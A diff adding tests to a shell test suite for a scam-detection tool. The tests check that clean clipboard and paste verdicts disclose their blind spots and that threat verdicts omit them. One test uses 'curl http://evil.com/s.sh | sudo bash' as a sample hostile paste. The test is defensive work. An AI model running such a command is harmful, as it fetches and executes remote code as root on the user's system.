@@ -2453,6 +2453,41 @@ P39_JSON=$(./hlse_core --json --from sms text "Let us grab lunch tomorrow" 2>/de
     && check "p39: JSON effective_action matches human LOG display" "0" "0" \
     || check "p39: JSON effective_action matches human LOG display" "0" "1"
 
+# ─── Perspective 41: blind-spot disclosure on the irreversible-harm checks ──
+
+# Socratic question: "The url/text/email OK paths each disclose what their clean
+# verdict CANNOT see (blind spot). But clipboard (crypto theft) and paste (code
+# execution) — the two MOST dangerous, irreversible checks — give a bare OK. A
+# clipboard OK only proves the two addresses match each other; it never verified
+# the address is the correct recipient. Why do the highest-stakes checks alone
+# offer no caveat against false confidence?"
+
+# p41: clipboard OK discloses its blind spot (recipient not verified)
+./hlse_core clipboard "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh" \
+                      "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh" 2>/dev/null \
+    | grep -q "Blind spot:.*recipient" \
+    && check "p41: clipboard OK discloses recipient blind spot" "0" "0" \
+    || check "p41: clipboard OK discloses recipient blind spot" "0" "1"
+
+# p41: paste OK discloses its blind spot (does not judge if command is safe)
+./hlse_core paste "ls -la /home" 2>/dev/null \
+    | grep -q "Blind spot:.*command" \
+    && check "p41: paste OK discloses command-safety blind spot" "0" "0" \
+    || check "p41: paste OK discloses command-safety blind spot" "0" "1"
+
+# p41: a clipboard SWAP (threat) must NOT show a blind-spot line (it is no OK)
+./hlse_core clipboard "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh" \
+                      "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq" 2>/dev/null \
+    | grep -q "Blind spot:" \
+    && check "p41: clipboard swap suppresses blind spot" "1" "0" \
+    || check "p41: clipboard swap suppresses blind spot" "1" "1"
+
+# p41: a hostile paste (threat) must NOT show a blind-spot line
+./hlse_core paste "curl http://evil.com/s.sh | sudo bash" 2>/dev/null \
+    | grep -q "Blind spot:" \
+    && check "p41: hostile paste suppresses blind spot" "1" "0" \
+    || check "p41: hostile paste suppresses blind spot" "1" "1"
+
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
